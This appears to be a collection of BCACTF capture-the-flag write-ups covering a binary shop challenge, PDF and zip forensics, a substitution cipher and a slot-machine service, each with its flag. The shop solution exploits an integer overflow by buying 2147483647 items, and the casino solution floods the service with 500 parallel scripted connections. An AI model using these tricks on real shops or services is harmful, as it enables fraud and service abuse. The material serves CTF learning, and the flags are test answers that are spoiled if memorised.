# BCA Mart
**Category :** binex

# Description
After the pandemic hit, everybody closed up shop and moved online. Not wanting to be left behind, BCA MART is launching its own digital presence. Shop BCA MART from the comfort of your own home today!

# Solution
A source file, binary file and a netcat host:port were given.

```
$ file bca-mart
bca-mart: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc848e79181e575b4c63ed0596fee4d52e3cdfd, for GNU/Linux 3.2.0, not stripped
```

We can see that file is a 64bit ELF binary.

My analysis on the source code.
* From looking at the source code we can see that money is a fixed value 15.
* There were to scanfs in the code, so 2 inputs.
* 1st scanf - definitely, we need to send 6 in here for the flag.
* 2nd scanf - we need to send the amount of flags in here, any number of our wish.
```
...
  3
  4 int money = 15;
...
  8     printf("How many %s would you like to buy?\n", item);
  9     printf("> ");
 10     scanf("%d", &amount);
...
 53         puts("What would you like to buy?");
 54
 55         printf("> ");
 56         scanf("%d", &input);
...
```

**Max length of int (4bytes) is -2,147,483,648 to 2,147,483,647.**

So if we send the amount as 2147483647, cost variable will overflow to negative since cost *= amount and cost is an int. Then cost will become negative and will be less than the money value. As we are returning the amount value in 2147483647 will still be positive. So purchase returns greater than zero success.

```c
$ nc bin.bcactf.com 49153
Welcome to BCA MART!
We have tons of snacks available for purchase.
(Please ignore the fact we charge a markup on everything)

1) Hichew™: $2.00
2) Lays® Potato Chips: $2.00
3) Water in a Bottle: $1.00
4) Not Water© in a Bottle: $2.00
5) BCA© school merch: $20.00
6) Flag: $100.00
0) Leave

You currently have $15.
What would you like to buy?
> 6
How many super-cool ctf flags would you like to buy?
> 2147483647
That'll cost $-100.
Thanks for your purchse!
bcactf{bca_store??_wdym_ive_never_heard_of_that_one_before}


1) Hichew™: $2.00
2) Lays® Potato Chips: $2.00
3) Water in a Bottle: $1.00
4) Not Water© in a Bottle: $2.00
5) BCA© school merch: $20.00
6) Flag: $100.00
0) Leave

You currently have $115.
What would you like to buy?
> ^C
```

## Flag
```bcactf{bca_store??_wdym_ive_never_heard_of_that_one_before}```
---
---
---

# Gerald's New Job
**Category :** forensic

## Description
Being a secret agent didn't exactly work out for Gerald. He's been training to become a translator for dinosaurs going on vacation, and he just got his traslator's licence. But when he sees it, it doesn't seem to belong to him... can you help him find his licence?

## Solution
Use binwalk to extract the contents of the pdf and look for GeraldFlag.png.

```bash
# extract the contents in the pdf file
$ binwalk -e gerald.pdf
# view it in a image viewer
$ eog _gerald.pdf.extracted/GeraldFlag.png
```

## Flag
```bcactf{g3ra1d_15_a_ma5ter_p01yg1ot_0769348}```
---
---
---

# Infinite Zip
**Category :** foren

## Description
Here's a zip, there's a zip. Zip zip everywhere.

## Solution
Provided a multi level zip file.

```bash
# unzip the file for first time
$ unzip flag.zip
# for loop to unzip the file for multiple times
$ for i in {999..0}; do unzip "{i}.zip"; done
# grep the flag
$ strings flag.png | grep -i bcactf
```

# Flag
```bcactf{z1p_1n51d3_4_z1p_4_3v3r}```
---
---
---

# 􃗁􌲔􇺟􊸉􁫞􄺷􄧻􃄏􊸉 (runescape)
**Category:** crypto

**Clue 1 :- Try finding the possible location of the flag in the given document.**

**Clue 2 :- Try replacing the possible chars. (%s/􆞎/b/g)**

## Description :
Here's some enciphered text. Find the flag.

## Solution :
Replace the possible chars like.

􆞎􄺷􄧻􄺷􇽛􌶴{...} --> bcactf{...}

Replace the known prepositions like *of*, *is*, *for*, etc.,

We can even identify a link to wikipedia which helps us to get some more details regarding the document.

After replacing all the 26 chars we can see the complete document.

Finally, we can get the flag.
􆞎􄺷􄧻􄺷􇽛􌶴{􁫞􆖓􃗁􃗁􉯓_􏕈􊸉_􃗁􄧻􇺟_􆖓􌲔􇽛_􆖓􌶴_􃗁􌲔􇺟􊸉􁫞_􁫞􀴠􃗁􉂫􏕈􆞎􋄚} ---> bcactf{sorry_we_ran_out_of_runes_sjrhwbg}

Note:- Notice that the final document doesn't have any captial letters and numbers & special chars stayed same.

## Flag :
```bcactf{sorry_we_ran_out_of_runes_sjrhwbg}```
---
---
---

# Welcome to the Casino
**Category :** misc

## Description :
Can you get three-of-a-kind on this slot machine? Let's find out!

## Solution :
This is a challenge where you have to connect to a given host & port with netcat for a tcp connection. And provide the requested letter to start the spinning.

I created a small python script to connect automatically and provide the required input. Please find it below.
```
$ cat connect.py
import socket
from time import sleep

HOST = 'misc.bcactf.com'  # The server's hostname or IP address
PORT = 49156        # The port used by the server

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))

    # anything near can be used like 'Enter the letter "' 
    # but I got better results like this.
    findstr = 'er "'
    i = 1
    while True:
        try:
            #sleep(1)
            reply = s.recv(1024)
            if not reply:
                break
            freply = "\n".join(reply.decode().splitlines())
            print(f"recvd [{i}]:\n{freply}")

            result = freply.find(findstr)
            #print(result)
            #print(findstr)
            if (result != -1):
                #print(freply[result:])
                firstkey = freply[result + len(findstr)]
                #print(f'{firstkey}')
                s.send(bytes(firstkey, 'utf-8'))

        except KeyboardInterrupt:
            print("bye")
            break
        i += 1
    s.close()
```

Above script only makes a single connection to the host but we need to make multiple connections. So I just did a simple shell multithreading like below. (here output for each connection is stored in *\<num\>.txt* file.)

```
$ for i in {1..500}; do python3 connect.py >"${i}.txt" & done
```
But this got me several failed connections. Where the program stays up trying to listen from the host but the host doesn't respond.

```
# lists no. of empty files
$ for i in *.txt; do if [ ! -s "$i" ]; then echo $i; fi; done | wc -l
368
# lists no. of jobs that are still running.
$ jobs | wc -l
368
# kill all my remaining jobs
$ kill $(jobs -p)
# grep the congrats files
$ grep -i cong -A 20 *.txt | vi -
```
But from the successful connection outputs, I found different prizes like *zstegasaurus plushie*, *MISSINGNO* and *respect*.

Instead of trying to pop multiple connections at the same instant, I added a little delay so that I can limit my failed connections, pop a new connection by sleeping a second.
```
$ for i in {1..500}; do sleep 1;python3 connect.py >"${i}.txt" & done
```
I got lucky this time, as I got no failed connections and finally the **grand prize** flag.
```
recvd [35]:
Congratulations! You won the grand prize!
recvd [36]:

recvd [37]:
It's a flag!
recvd [38]:

recvd [39]:

recvd [40]:
   .^.
  (( ))
   |#|_______________________________
   |#||$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
   |#||$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
   |#||$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
   |#||$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
   |#||$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
   |#||$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
   |#||$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
   |#||$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
   |#||$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
   |#||$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
   |#|'""""""""""""""""""""""""""""""'
   |#|
   |#|
   |#|
   |#|
   |#|
   |#|
   |#|
   |#|
   |#|
   |#|
   |#|
   |#|
   |#|
   |#|
   |#|

recvd [41]:
bcactf{y0u_g0t_1ucKy_af23dd97g64n}
recvd [42]:


recvd [43]:
Come back next time!
recvd [44]:
```

Note: added the [output file](./394.txt) where flag is present.

## Flag :
```bcactf{y0u_g0t_1ucKy_af23dd97g64n}```

